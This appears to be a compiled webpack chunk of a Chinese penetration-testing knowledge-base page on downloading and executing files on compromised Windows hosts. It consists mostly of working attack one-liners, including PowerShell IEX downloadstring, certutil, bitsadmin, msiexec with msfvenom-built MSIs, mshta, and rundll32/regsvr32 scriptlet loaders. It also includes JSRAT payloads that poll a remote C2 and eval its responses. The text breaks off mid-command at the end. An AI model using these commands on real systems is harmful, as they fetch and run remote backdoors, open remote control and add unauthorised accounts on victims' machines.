"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[9903],{11651:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>t,toc:()=>h});const t=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/\u6e17\u900f\u6280\u5de7/Windows\u6267\u884c\u547d\u4ee4\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3","title":"Windows\u6267\u884c\u547d\u4ee4\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3","description":"\u524d\u8a00","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/12.\u5185\u7f51\u6e17\u900f/08.\u6e17\u900f\u6280\u5de7/01.Windows\u6267\u884c\u547d\u4ee4\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/12.\u5185\u7f51\u6e17\u900f/08.\u6e17\u900f\u6280\u5de7","slug":"/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/\u6e17\u900f\u6280\u5de7/Windows\u6267\u884c\u547d\u4ee4\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/\u6e17\u900f\u6280\u5de7/Windows\u6267\u884c\u547d\u4ee4\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts","lastUpdatedAt":1749874405000,"sidebarPosition":1,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"\u6e17\u900f\u6280\u5de7","permalink":"/docs/category/\u6e17\u900f\u6280\u5de7"},"next":{"title":"\u4e00\u6761\u547d\u4ee4\u53cd\u5f39shell","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/\u6e17\u900f\u6280\u5de7/\u4e00\u6761\u547d\u4ee4\u53cd\u5f39shell"}}');var l=s(74848),c=s(28453);const r={},i=void 0,a={},h=[{value:"\u524d\u8a00",id:"\u524d\u8a00",level:2},{value:"\u5b9e\u73b0\u65b9\u5f0f",id:"\u5b9e\u73b0\u65b9\u5f0f",level:2},{value:"Powershell",id:"powershell",level:3},{value:"FTP",id:"ftp",level:3},{value:"IPC$",id:"ipc",level:3},{value:"Certutil",id:"certutil",level:3},{value:"bitsadmin",id:"bitsadmin",level:3},{value:"wget",id:"wget",level:3},{value:"msiexec",id:"msiexec",level:3},{value:"IEExec",id:"ieexec",level:3},{value:"python",id:"python",level:3},{value:"mshta",id:"mshta",level:3},{value:"rundll32",id:"rundll32",level:3},{value:"regsvr32",id:"regsvr32",level:3},{value:"MSXSL.EXE",id:"msxslexe",level:3},{value:"MSIEXEC",id:"msiexec-1",level:3},{value:"JS\u4e0b\u8f7d\u8005",id:"js\u4e0b\u8f7d\u8005",level:3},{value:"pubprn.vbs",id:"pubprnvbs",level:3},{value:"\u53c2\u8003",id:"\u53c2\u8003",level:2}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.h2,{id:"\u524d\u8a00",children:"\u524d\u8a00"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"\u603b\u7ed3\u4e00\u4e0b\u6587\u4ef6\u4e0b\u8f7d\u548c\u4e00\u4e9b\u51b7\u95e8\u7684\u6267\u884c\u547d\u4ee4\u7684\u65b9\u6cd5\uff0c\u5efa\u8bae\u6839\u636e\u5f53\u524d\u7cfb\u7edf\u7684\u73af\u5883\uff0c\u5982\u6709Java\u5c31\u8003\u8651Java\u7684\u65b9\u5f0f"}),"\n",(0,l.jsx)(n.p,{children:"\u6700\u65b9\u4fbf\u7684\u8fd8\u662f\u901a\u8fc7webshell\u7ba1\u7406\u5de5\u5177\u6216\u8005C2\u53bb\u4e0a\u4f20\u4e0b\u8f7d"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u6e17\u900f\u6216\u662f\u75c5\u6bd2\u5206\u6790\u603b\u662f\u4f1a\u9047\u5230\u5f88\u591a\u5343\u5947\u767e\u602a\u7684\u4e0b\u8f7d\u6587\u4ef6\u548c\u6267\u884c\u547d\u4ee4\u7684\u65b9\u6cd5\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u5f53\u6211\u4eec\u901a\u8fc7Web\u6e17\u900f\u83b7\u53d6\u4e86\u4e00\u4e2aShell\uff0c\u800c\u4e14\u76ee\u6807\u4e3b\u673a\u662fWindows\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u53bb\u4e0b\u8f7d\u540e\u95e8\u6587\u4ef6\u5230\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\u5462\uff1f"}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u822c\u6765\u8bf4\uff0c\u5b9e\u73b0Windows\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u65b9\u5f0f\u4e0d\u5916\u4e4e\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\u3002"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u7b2c\u4e00\u79cd\uff0c\u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\u5230\u672c\u5730\uff0c\u7136\u540e\u518d\u6267\u884c\uff1b"}),"\n",(0,l.jsxs)(n.li,{children:["\u7b2c\u4e8c\u79cd\uff0c",(0,l.jsx)(n.strong,{children:"\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\uff0c\u6267\u884c\u8fc7\u7a0b\u6ca1\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u843d\u5730\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5df2\u7136\u6210\u4e3a\u540e\u95e8\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u9996\u8981\u65b9\u5f0f"}),"\u3002"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"\u5b9e\u73b0\u65b9\u5f0f",children:"\u5b9e\u73b0\u65b9\u5f0f"}),"\n",(0,l.jsx)(n.h3,{id:"powershell",children:"Powershell"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"win2003\u3001winXP\u4e0d\u652f\u6301"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"# \u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\npowershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\" \n\npowershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))\"\n\n# \u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\npowershell -exec bypass -c (new-objectSystem.Net.WebClient).DownloadFile('http://webserver/payload.ps1','E:\\payload.ps1')\n"})}),"\n",(0,l.jsx)(n.h3,{id:"ftp",children:"FTP"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"ftp 192.168.3.2\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u540e"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"cd E:\\file # \u8fdb\u5165E\u76d8\u4e0b\u7684file\u76ee\u5f55\ncd www # \u8fdb\u5165\u670d\u52a1\u5668\u4e0a\u7684www\u76ee\u5f55\nget access.log # \u5c06\u670d\u52a1\u5668\u4e0a\u7684access.log\u4e0b\u8f7d\u5230E:\\file\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u53ef\u4ee5\u53c2\u8003\uff1a",(0,l.jsx)(n.a,{href:"https://baike.baidu.com/item/ftp/13839",children:"https://baike.baidu.com/item/ftp/13839"})]}),"\n",(0,l.jsx)(n.h3,{id:"ipc",children:"IPC$"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'#\u5efa\u7acb\u8fdc\u7a0bIPC\u8fde\u63a5\nnet use \\\\192.168.3.1\\ipc$ /user:administrator "abc123!"\n\n#\u590d\u5236\u8fdc\u7a0b\u6587\u4ef6\u5230\u672c\u5730\u4e3b\u673a\ncopy \\\\192.168.3.1\\c$\\test.exe E:\\file\n'})}),"\n",(0,l.jsx)(n.h3,{id:"certutil",children:"Certutil"}),"\n",(0,l.jsxs)(n.p,{children:["\u53ef\u4ee5\u53c2\u8003\uff1a",(0,l.jsx)(n.a,{href:"https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx",children:"https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx"})]}),"\n",(0,l.jsx)(n.p,{children:"\u5e94\u7528\u5230: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"# \u4e0b\u8f7d\u6587\u4ef6\ncertutil -urlcache -split -f http://192.168.3.1/test.txt file.txt\n# \u5220\u9664\u7f13\u5b58\ncertutil -urlcache -split -f http://192.168.3.1/test.txt delete\n"})}),"\n",(0,l.jsx)(n.h3,{id:"bitsadmin",children:"bitsadmin"}),"\n",(0,l.jsxs)(n.p,{children:["\u53ef\u4ee5\u53c2\u8003\uff1a",(0,l.jsx)(n.a,{href:"https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx",children:"https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\\file\\test.txt\nbitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\\file\\test.txt\nbitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\\test\\1.txt\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5b8c\u6574\u5229\u7528:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"cmd.exe /c bitsadmin /transfer d90f http://site.com/a \n%APPDATA%d90f.exe&%APPDATA%d90f.exe&del %APPDATA%d90f.exe\n"})}),"\n",(0,l.jsx)(n.h3,{id:"wget",children:"wget"}),"\n",(0,l.jsx)(n.p,{children:"Windows\u73af\u5883\u4e0b\uff0c\u53ef\u4e0a\u4f20\u514d\u5b89\u88c5\u7684\u53ef\u6267\u884c\u7a0b\u5e8fwget.exe\u5230\u76ee\u6807\u673a\u5668\uff0c\u4f7f\u7528wget\u4e0b\u8f7d\u6587\u4ef6\u3002"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"wget.exe"}),"\u4e0b\u8f7d\uff1a",(0,l.jsx)(n.a,{href:"https://eternallybored.org/misc/wget/",children:"https://eternallybored.org/misc/wget/"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'wget -O "evil.txt" http://192.168.28.128/imag/evil.txt\n'})}),"\n",(0,l.jsx)(n.h3,{id:"msiexec",children:"msiexec"}),"\n",(0,l.jsx)(n.p,{children:"msiexec \u652f\u6301\u8fdc\u7a0b\u4e0b\u8f7d\u529f\u80fd\uff0c\u5c06msi\u6587\u4ef6\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u8fdc\u7a0b\u6267\u884c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"#\u751f\u6210msi\u5305\nmsfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi\n#\u8fdc\u7a0b\u6267\u884c\nmsiexec /q /i http://192.168.28.128/evil.msi\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"use png"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"msiexec /q /i http://site.com/payloads/calc.png\n"})}),"\n",(0,l.jsx)(n.h3,{id:"ieexec",children:"IEExec"}),"\n",(0,l.jsx)(n.p,{children:"IEexec.exe\u5e94\u7528\u7a0b\u5e8f\u662f.NET Framework\u9644\u5e26\u7a0b\u5e8f\uff0c\u5b58\u5728\u4e8e\u591a\u4e2a\u7cfb\u7edf\u767d\u540d\u5355\u5185\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u9700\u8981\u6267\u884c\u4e24\u6761\u547d\u4ee4\uff0c\u4e00\u6761\u5173\u95ed.net\u5b89\u5168\u7b56\u7565\uff0c\u4e00\u6761\u4e0b\u8f7d"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727> caspol -s off\n\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727> IEExec http://192.168.3.1/test.exe\n"})}),"\n",(0,l.jsx)(n.h3,{id:"python",children:"python"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"C:\\python27\\python.exe -c \"import urllib2; exec urllib2.urlopen('http://192.168.3.1/test.zip').read();\"\n"})}),"\n",(0,l.jsx)(n.h3,{id:"mshta",children:"mshta"}),"\n",(0,l.jsx)(n.p,{children:"mshta\u7528\u4e8e\u6267\u884c.hta\u6587\u4ef6\uff0c\u800chta\u662fHTML Applocation \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662fHTML\u5e94\u7528\u7a0b\u5e8f\u3002\u800chta\u4e2d\u4e5f\u652f\u6301VBS\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528hta\u6765\u4e0b\u8f7d\u6587\u4ef6\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"mshta http://192.168.3.1/run.hta\n"})}),"\n",(0,l.jsx)(n.p,{children:"run.hta \u5185\u5bb9\u5982\u4e0b\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-html",children:'<HTML> \n<meta http-equiv="Content-Type" content="text/html; charset=utf-8">\n<HEAD> \n<script language="VBScript">\nWindow.ReSizeTo 0, 0\nWindow.moveTo -2000,-2000\nSet objShell = CreateObject("Wscript.Shell")\nobjShell.Run "cmd.exe /c net user" // \u8fd9\u91cc\u586b\u5199\u547d\u4ee4\nself.close\n<\/script>\n<body>\ndemo\n</body>\n</HEAD> \n</HTML>\n'})}),"\n",(0,l.jsx)(n.p,{children:"mshta\u662f\u7528\u6765\u6267\u884chta\u6587\u4ef6\u7684\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\uff0c\u5176\u5b9e\u6ca1\u6709hta\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7mshta\u6765\u6267\u884c\u547d\u4ee4\u7684\uff0c\u7ecf\u8fc7\u51e0\u6b21\u6d4b\u8bd5\u53d1\u73b0mshta\u4e0d\u4ec5\u53ef\u4ee5\u4f7f\u7528vbscript\uff0c\u800c\u4e14\u53ef\u4ee5\u4f7f\u7528javascript\u6765\u6267\u884c\u547d\u4ee4\uff0c\u6574\u7406payload\u5982\u4e0b\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"VBSCRIPT EXEC"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close)\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"JAVASCRIPT EXEC"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'mshta javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();\nh=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"JSRAT"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'mshta javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();\nh=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open\n("GET","http://192.168.2.101:9998/connect",false);try{h.Send();\nb=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").\nRun("cmd /c taskkill /f /im mshta.exe",0,true);}\n'})}),"\n",(0,l.jsx)(n.h3,{id:"rundll32",children:"rundll32"}),"\n",(0,l.jsx)(n.p,{children:"\u5176\u5b9e\u8fd8\u662f\u4f9d\u8d56\u4e8eWScript.shell\u8fd9\u4e2a\u7ec4\u4ef6"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528JSRat\u6765\u505a\u6f14\u793a\uff0cJSRat\u662f\u4e00\u4e2a\u547d\u4ee4\u548c\u63a7\u5236\u6846\u67b6\uff0c\u4ec5\u4e3arundll32.exe\u548cregsvr32.exe\u751f\u6210\u6076\u610f\u7a0b\u5e8f\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["\u9879\u76ee\u5730\u5740\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/Hood3dRob1n/JSRat-Py.git",children:"https://github.com/Hood3dRob1n/JSRat-Py.git"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"# \u8fd0\u884cJSRat\n./JSRat -i 127.0.0.1 -p 8081\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"\u9ed8\u8ba4\u65b9\u5f0f"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'# \u76f4\u63a5\u8fd0\u884c\nrundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();\nh=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);\ntry{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").\nRun("cmd /c taskkill /f /im rundll32.exe",0,true);}%\n\nrundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"Use SCT"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u8fd0\u884cJSRAT:"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"# \u7ed3\u5408\u4e0b\u65b9\u7684regsvr32\nregsvr32 /s /n /u /i:http://urlto/JSRAT.sct scrobj.dll\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"JSRAT.sct"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-xml",children:'<?XML version="1.0"?>\n<scriptlet>\n<registration \n    progid="ShortJSRAT"\n    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >\n    \x3c!-- Learn from Casey Smith @subTee --\x3e\n    <script language="JScript">\n        <![CDATA[\n\n            rat="rundll32.exe javascript:\\"\\\\..\\\\mshtml,RunHTMLApplication \\";\ndocument.write();h=new%20ActiveXObject(\\"WinHttp.WinHttpRequest.5.1\\");w=new%20ActiveXObject\n(\\"WScript.Shell\\");try{v=w.RegRead(\\"HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\n\\\\\\\\Internet%20Settings\\\\\\\\ProxyServer\\");q=v.split(\\"=\\")[1].split(\\";\\")[0];h.SetProxy(2,q);}\ncatch(e){}h.Open(\\"GET\\",\\"http://127.0.0.1/connect\\",false);try{h.Send();B=h.ResponseText;eval(B);}\ncatch(e){new%20ActiveXObject(\\"WScript.Shell\\").Run(\\"cmd /c taskkill /f /im rundll32.exe\\",0,true);}";\n        new ActiveXObject("WScript.Shell").Run(rat,0,true);\n\n        ]]>\n<\/script>\n</registration>\n</scriptlet>\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"Use WSC"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u8fd0\u884c\u8ba1\u7b97\u5668"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();\nGetObject("script:http://urlto/calc.wsc")\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"calc.wsc"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n\n<package>\n<component id="testCalc">\n\n<script language="JScript">\n<![CDATA[\nvar r = new ActiveXObject("WScript.Shell").Run("calc.exe"); \n]]>\n<\/script>\n\n</component>\n</package>\n\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u8fd0\u884cJSRAT"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();\nGetObject("script:http://urlto/JSRAT.wsc")\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"JSRAT.wsc:"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n\n<package>\n<component id="testCalc">\n\n<script language="JScript">\n<![CDATA[\n        rat="rundll32.exe javascript:\\"\\\\..\\\\mshtml,RunHTMLApplication \\";document.write();\nh=new%20ActiveXObject(\\"WinHttp.WinHttpRequest.5.1\\");w=new%20ActiveXObject(\\"WScript.Shell\\");try{v=w.RegRead(\\"HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Internet%20Settings\\\\\\\\ProxyServer\\");q=v.split(\\"=\\")[1].split(\\";\\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\\"GET\\",\\"http://127.0.0.1/connect\\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\\"WScript.Shell\\").Run(\\"cmd /c taskkill /f /im rundll32.exe\\",0,true);}";\n        new ActiveXObject("WScript.Shell").Run(rat,0,true);\n]]>\n<\/script>\n\n</component>\n</package>\n'})}),"\n",(0,l.jsx)(n.h3,{id:"regsvr32",children:"regsvr32"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll\n"})}),"\n",(0,l.jsx)(n.p,{children:"test.data\u5185\u5bb9\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-xml",children:'<?XML version="1.0"?>\n<scriptlet>\n<registration\n    progid="ShortJSRAT"\n    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >\n    \x3c!-- Learn from Casey Smith @subTee --\x3e\n    <script language="JScript">\n        <![CDATA[\n            ps  = "cmd.exe /c calc.exe";\n            new ActiveXObject("WScript.Shell").Run(ps,0,true);\n\n        ]]>\n<\/script>\n</registration>\n</scriptlet>\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u8fd8\u53ef\u4ee5\u5229\u7528 ",(0,l.jsx)(n.a,{href:"https://github.com/CroweCybersecurity/ps1encode",children:"https://github.com/CroweCybersecurity/ps1encode"})," \u751f\u6210sct(COM scriptlet \u2013 requires a webserver to stage the payload)"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"regsvr32 /u /s /i:http://192.168.3.1/test.sct scrobj.dll\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"USE PNG"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"regsvr32 /u /s /i:http://site.com/js.png scrobj.dll\n"})}),"\n",(0,l.jsx)(n.p,{children:"js.png"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-xml",children:'<?XML version="1.0"?>\n<let>\n<registration \n    progid="ShortJSRAT"\n    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >\n    \x3c!-- Learn from Casey Smith @subTee --\x3e\n    < language="J">\n    <![CDATA[\n        ps = "cmd.exe /c calc.exe";\n        new ActiveXObject("W.Shell").Run(ps,0,true);\n    ]]>\n    </>\n</registration>\n</let>\n'})}),"\n",(0,l.jsx)(n.h3,{id:"msxslexe",children:"MSXSL.EXE"}),"\n",(0,l.jsx)(n.p,{children:"msxsl.exe\u662f\u5fae\u8f6f\u7528\u4e8e\u547d\u4ee4\u884c\u4e0b\u5904\u7406XSL\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u901a\u8fc7\u4ed6\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884cJavaScript\u8fdb\u800c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://www.microsoft.com/en-us/download/details.aspx?id=21714",children:"Command Line Transformation Utility (msxsl.exe)"})}),"\n",(0,l.jsx)(n.p,{children:"msxsl.exe \u9700\u8981\u63a5\u53d7\u4e24\u4e2a\u6587\u4ef6\uff0cXML\u53caXSL\u6587\u4ef6\uff0c\u547d\u4ee4\u884c\u64cd\u4f5c\u5982\u4e0b\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"msxsl.exe demo.xml exec.xsl\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"demo.xml"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>\n<customers>\n<customer>\n<name>Microsoft</name>\n</customer>\n</customers>\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"exec.xsl"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-xml",children:'<?xml version=\'1.0\'?>\n<xsl:stylesheet version="1.0"\nxmlns:xsl="http://www.w3.org/1999/XSL/Transform"\nxmlns:msxsl="urn:schemas-microsoft-com:xslt"\nxmlns:user="http://mycompany.com/mynamespace">\n\n<msxsl:script language="JScript" implements-prefix="user">\n   function xml(nodelist) {\nvar r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");\n   return nodelist.nextNode().xml;\n\n   }\n</msxsl:script>\n<xsl:template match="/">\n   <xsl:value-of select="user:xml(.)"/>\n</xsl:template>\n</xsl:stylesheet>\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u540c\u6837\u7684\uff0c",(0,l.jsx)(n.strong,{children:"msxsl.exe\u53ef\u4ee5\u8fdc\u7a0b\u52a0\u8f7d"}),"\uff0c\u5177\u4f53\u65b9\u5f0f\u5982\u4e0b\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"msxsl https://website.com/scripts/demo.xml https://website.com/scripts/exec.xsl\nmsxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl\n"})}),"\n",(0,l.jsx)(n.h3,{id:"msiexec-1",children:"MSIEXEC"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"msiexec \u652f\u6301\u8fdc\u7a0b\u4e0b\u8f7d\u529f\u80fd\uff0c\u5c06msi\u6587\u4ef6\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u8fdc\u7a0b\u6267\u884c"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"MSF\u751f\u6210MSI\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"msfvenom -f msi -p windows/exec CMD=calc.exe > 